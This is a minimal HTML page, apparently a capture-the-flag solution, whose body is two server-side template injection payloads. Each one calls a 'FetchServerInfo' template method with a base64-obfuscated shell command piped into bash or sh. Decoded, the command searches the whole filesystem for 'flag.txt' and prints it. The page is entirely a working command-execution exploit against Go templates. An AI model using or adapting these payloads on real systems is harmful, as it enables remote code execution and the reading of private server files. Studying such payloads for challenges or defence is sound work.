<!doctype html>
<html>
  <head>
    <title>This is the title of the webpage!</title>
  </head>
  <body>
<p>{{.FetchServerInfo "echo ZmluZCAvIC1uYW1lIGZsYWcudHh0IDI+L2Rldi9udWxsIC1leGVjICdjYXQnIHt9IFw7 | base64 -d | bash
"}}</p>
<p>{{.FetchServerInfo "echo ZmluZCAvIC1uYW1lIGZsYWcudHh0IDI+L2Rldi9udWxsIC1leGVjICdjYXQnIHt9IFw7 | base64 -d | sh
"}}</p>


  </body>
</html>
